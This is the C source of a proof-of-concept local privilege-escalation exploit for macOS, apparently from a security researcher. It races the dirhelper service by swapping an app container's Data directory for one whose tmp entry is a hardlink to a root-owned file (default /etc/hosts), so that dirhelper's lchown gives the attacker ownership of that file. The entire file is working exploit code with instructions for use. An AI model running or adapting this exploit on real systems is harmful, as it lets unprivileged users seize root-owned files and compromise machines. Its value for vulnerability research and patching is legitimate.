/*
 * race_swap.c - Glarus PoC Component
 * 
 * This version works with a persistent DirhelperClient that loops internally.
 * 
 * Architecture:
 *   - exploit.sh spawns DirhelperClient ONCE with count=5000
 *   - exploit.sh spawns race_swap in parallel
 *   - DirhelperClient makes MIG calls in a tight loop
 *   - race_swap monitors Data/ with kqueue and swaps on detection
 *   - Both processes run until success or DirhelperClient finishes
 * 
 * This avoids the sandbox crash problem because DirhelperClient only
 * initializes its sandbox ONCE at startup.
 * 
 * Copyright (c) 2025 Golden Helm Securities
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <sys/stat.h>
#include <sys/event.h>
#include <sys/time.h>
#include <pwd.h>

#define DEFAULT_TARGET      "/etc/hosts"
#define DEFAULT_TIMEOUT     60          /* seconds */
#define SPIN_ITERATIONS     50

static volatile int g_running = 1;

static char g_container_name[256];
static char g_container_base[1024];
static char g_data_dir[1024];
static char g_data_backup[1024];
static char g_fake_dir[1024];
static char g_data_tmp[1024];
static char g_fake_tmp[1024];
static char g_target_file[1024];

static uid_t g_my_uid;
static uid_t g_original_uid;

/* Statistics */
static unsigned long g_detections = 0;
static unsigned long g_swaps = 0;
static unsigned long g_swap_failures = 0;

static void signal_handler(int sig) {
    (void)sig;
    g_running = 0;
}

static int check_win(void) {
    struct stat st;
    if (stat(g_target_file, &st) == 0) {
        return st.st_uid == g_my_uid;
    }
    return 0;
}

/*
 * Atomic directory swap using rename()
 */
static inline int do_swap(void) {
    /* Step 1: Move Data to Data_backup */
    if (rename(g_data_dir, g_data_backup) != 0) {
        g_swap_failures++;
        return -1;
    }
    
    /* Step 2: Move Fake to Data */
    if (rename(g_fake_dir, g_data_dir) != 0) {
        g_swap_failures++;
        /* Try to restore */
        rename(g_data_backup, g_data_dir);
        return -1;
    }
    
    g_swaps++;
    return 0;
}

/*
 * Undo swap - restore original state for next attempt
 */
static void undo_swap(void) {
    struct stat st;
    
    /* Move current Data (was Fake) back to Fake position */
    if (lstat(g_data_dir, &st) == 0) {
        rename(g_data_dir, g_fake_dir);
    }
    
    /* Restore Data from backup */
    if (lstat(g_data_backup, &st) == 0) {
        rename(g_data_backup, g_data_dir);
    }
    
    /* Remove Data/tmp that dirhelper created */
    rmdir(g_data_tmp);
    
    /* Remove Fake/tmp (it's now a directory) and recreate hardlink */
    rmdir(g_fake_tmp);
    unlink(g_fake_tmp);
    link(g_target_file, g_fake_tmp);
}

/*
 * Ensure clean state - called at startup and after errors
 */
static void ensure_clean_state(void) {
    struct stat st;
    
    /* If Data_backup exists, we crashed mid-swap - restore */
    if (lstat(g_data_backup, &st) == 0) {
        if (lstat(g_data_dir, &st) == 0) {
            /* Move current Data to Fake */
            rename(g_data_dir, g_fake_dir);
        }
        /* Restore Data from backup */
        rename(g_data_backup, g_data_dir);
    }
    
    /* Ensure Data exists */
    if (lstat(g_data_dir, &st) != 0) {
        mkdir(g_data_dir, 0755);
    }
    
    /* Remove Data/tmp if it exists */
    rmdir(g_data_tmp);
    unlink(g_data_tmp);
    
    /* Ensure Fake exists */
    if (lstat(g_fake_dir, &st) != 0) {
        mkdir(g_fake_dir, 0755);
    }
    
    /* Ensure Fake/tmp is hardlink to target */
    if (lstat(g_fake_tmp, &st) == 0) {
        if (S_ISDIR(st.st_mode)) {
            rmdir(g_fake_tmp);
            link(g_target_file, g_fake_tmp);
        }
    } else {
        link(g_target_file, g_fake_tmp);
    }
}

/*
 * Main race loop using kqueue
 * 
 * Monitors Data/ directory for changes and swaps when mkdir detected.
 * Runs until success, timeout, or signal.
 */
static int race_loop(int timeout_secs) {
    int kq;
    int data_fd = -1;
    struct kevent change, event;
    struct stat st;
    struct timespec timeout = { 0, 5000000 };  /* 5ms poll */
    time_t start_time = time(NULL);
    time_t last_progress = start_time;
    
    kq = kqueue();
    if (kq < 0) {
        perror("kqueue");
        return 1;
    }
    
    printf("[*] Race loop started (timeout: %ds)\n", timeout_secs);
    printf("[*] Monitoring: %s\n", g_data_dir);
    printf("[*] Waiting for triggers from DirhelperClient...\n\n");
    
    while (g_running) {
        /* Check timeout */
        time_t now = time(NULL);
        if (now - start_time >= timeout_secs) {
            printf("\n[!] Timeout reached (%d seconds)\n", timeout_secs);
            break;
        }
        
        /* 
         * CRITICAL: Remove Data/tmp so dirhelper creates it fresh!
         * If Data/tmp already exists, dirhelper skips mkdir() and goes
         * straight to lchown() - we'd miss the race window entirely.
         */
        rmdir(g_data_tmp);
        
        /* Ensure Data directory exists for monitoring */
        if (lstat(g_data_dir, &st) != 0) {
            ensure_clean_state();
            usleep(1000);
            continue;
        }
        
        /* Open Data directory for monitoring */
        data_fd = open(g_data_dir, O_RDONLY | O_EVTONLY);
        if (data_fd < 0) {
            usleep(1000);
            continue;
        }
        
        /* Register for write events (mkdir triggers this) */
        EV_SET(&change, data_fd, EVFILT_VNODE, 
               EV_ADD | EV_CLEAR | EV_ONESHOT,
               NOTE_WRITE, 0, NULL);
        
        if (kevent(kq, &change, 1, NULL, 0, NULL) < 0) {
            close(data_fd);
            continue;
        }
        
        /* Wait for event */
        int n = kevent(kq, NULL, 0, &event, 1, &timeout);
        
        close(data_fd);
        data_fd = -1;
        
        if (n > 0 && (event.fflags & NOTE_WRITE)) {
            /* Directory changed - check if Data/tmp was created */
            if (lstat(g_data_tmp, &st) == 0 && S_ISDIR(st.st_mode)) {
                g_detections++;
                
                /* SWAP NOW! */
                if (do_swap() == 0) {
                    /* Brief spin to let lchown execute */
                    for (volatile int i = 0; i < SPIN_ITERATIONS; i++) {
                        __asm__ volatile("" ::: "memory");
                    }
                    
                    /* Check if we won */
                    if (check_win()) {
                        close(kq);
                        
                        printf("\n");
                        printf("╔══════════════════════════════════════════════════════════════╗\n");
                        printf("║                    🎉 RACE WON! 🎉                           ║\n");
                        printf("╚══════════════════════════════════════════════════════════════╝\n\n");
                        printf("Target file: %s\n", g_target_file);
                        printf("New owner:   uid=%d (you)\n", g_my_uid);
                        printf("Old owner:   uid=%d (root)\n", g_original_uid);
                        printf("\nStatistics:\n");
                        printf("  Detections:    %lu\n", g_detections);
                        printf("  Swaps:         %lu\n", g_swaps);
                        printf("  Swap failures: %lu\n", g_swap_failures);
                        printf("  Time elapsed:  %ld seconds\n", time(NULL) - start_time);
                        printf("\n");
                        return 0;
                    }
                    
                    /* Didn't win - undo and continue */
                    undo_swap();
                    
                    /* Remove Data/tmp so next trigger creates it fresh */
                    rmdir(g_data_tmp);
                } else {
                    /* Swap failed - just remove Data/tmp and continue */
                    rmdir(g_data_tmp);
                }
            }
        }
        
        /* Progress indicator every second */
        now = time(NULL);
        if (now > last_progress) {
            printf("\r[*] Running... detections=%lu swaps=%lu failures=%lu elapsed=%lds   ",
                   g_detections, g_swaps, g_swap_failures, now - start_time);
            fflush(stdout);
            last_progress = now;
        }
    }
    
    close(kq);
    
    printf("\n\n[!] Race did not succeed\n");
    printf("[!] Final stats: detections=%lu swaps=%lu failures=%lu\n",
           g_detections, g_swaps, g_swap_failures);
    
    return 1;
}

static void usage(const char *prog) {
    printf("Glarus Race Swap v4 - Parallel Monitor Mode\n\n");
    printf("Usage: %s -c <bundle_id> -t <target_file> [-T timeout]\n\n", prog);
    printf("Options:\n");
    printf("  -c <bundle>   Container bundle ID (required)\n");
    printf("  -t <file>     Target file to own (default: %s)\n", DEFAULT_TARGET);
    printf("  -T <seconds>  Timeout in seconds (default: %d)\n", DEFAULT_TIMEOUT);
    printf("  -h            Show this help\n\n");
    printf("This binary monitors and swaps. Run DirhelperClient separately\n");
    printf("with a high count to generate triggers.\n\n");
}

static void cleanup(void) {
    ensure_clean_state();
}

int main(int argc, char *argv[]) {
    char *home;
    const char *container = NULL;
    const char *target = DEFAULT_TARGET;
    int timeout_secs = DEFAULT_TIMEOUT;
    int opt;
    struct stat st;
    
    while ((opt = getopt(argc, argv, "c:t:T:h")) != -1) {
        switch (opt) {
            case 'c': container = optarg; break;
            case 't': target = optarg; break;
            case 'T': timeout_secs = atoi(optarg); break;
            case 'h':
            default:
                usage(argv[0]);
                return (opt == 'h') ? 0 : 1;
        }
    }
    
    if (!container) {
        fprintf(stderr, "ERROR: Container bundle ID required (-c)\n");
        usage(argv[0]);
        return 1;
    }
    
    strncpy(g_container_name, container, sizeof(g_container_name) - 1);
    strncpy(g_target_file, target, sizeof(g_target_file) - 1);
    
    g_my_uid = getuid();
    
    home = getenv("HOME");
    if (!home) {
        struct passwd *pw = getpwuid(g_my_uid);
        if (pw) home = pw->pw_dir;
    }
    if (!home) {
        fprintf(stderr, "ERROR: Cannot determine home directory\n");
        return 1;
    }
    
    /* Build paths */
    snprintf(g_container_base, sizeof(g_container_base),
             "%s/Library/Containers/%s", home, g_container_name);
    snprintf(g_data_dir, sizeof(g_data_dir), "%s/Data", g_container_base);
    snprintf(g_data_backup, sizeof(g_data_backup), "%s/Data_backup", g_container_base);
    snprintf(g_fake_dir, sizeof(g_fake_dir), "%s/Fake", g_container_base);
    snprintf(g_data_tmp, sizeof(g_data_tmp), "%s/tmp", g_data_dir);
    snprintf(g_fake_tmp, sizeof(g_fake_tmp), "%s/tmp", g_fake_dir);
    
    /* Banner */
    printf("╔══════════════════════════════════════════════════════════════╗\n");
    printf("║  Glarus Race Swap v4 - Parallel Monitor                      ║\n");
    printf("╚══════════════════════════════════════════════════════════════╝\n\n");
    
    printf("Configuration:\n");
    printf("  Bundle ID:    %s\n", g_container_name);
    printf("  Data dir:     %s\n", g_data_dir);
    printf("  Fake dir:     %s\n", g_fake_dir);
    printf("  Target file:  %s\n", g_target_file);
    printf("  Timeout:      %d seconds\n\n", timeout_secs);
    
    /* Verify setup */
    printf("[*] Verifying setup...\n");
    
    if (lstat(g_data_dir, &st) != 0) {
        fprintf(stderr, "    ✗ Data directory missing\n");
        return 1;
    }
    printf("    ✓ Data directory exists\n");
    
    if (lstat(g_fake_dir, &st) != 0) {
        fprintf(stderr, "    ✗ Fake directory missing\n");
        return 1;
    }
    printf("    ✓ Fake directory exists\n");
    
    if (lstat(g_fake_tmp, &st) != 0) {
        fprintf(stderr, "    ✗ Fake/tmp (hardlink) missing\n");
        return 1;
    }
    ino_t fake_ino = st.st_ino;
    printf("    ✓ Fake/tmp exists (inode: %llu)\n", (unsigned long long)fake_ino);
    
    if (stat(g_target_file, &st) != 0) {
        fprintf(stderr, "    ✗ Target file missing\n");
        return 1;
    }
    g_original_uid = st.st_uid;
    
    if (st.st_ino != fake_ino) {
        fprintf(stderr, "    ✗ Hardlink verification failed\n");
        return 1;
    }
    printf("    ✓ Hardlink verified\n");
    
    /* Clean up any stale state */
    if (lstat(g_data_backup, &st) == 0) {
        printf("[*] Cleaning up stale state...\n");
        ensure_clean_state();
    }
    
    printf("\n");
    
    /* Setup signals */
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    atexit(cleanup);
    
    /* Run the race loop */
    int result = race_loop(timeout_secs);
    
    if (result == 0) {
        printf("Final file ownership:\n");
        char cmd[1200];
        snprintf(cmd, sizeof(cmd), "ls -la '%s'", g_target_file);
        system(cmd);
        printf("\n");
    }
    
    return result;
}

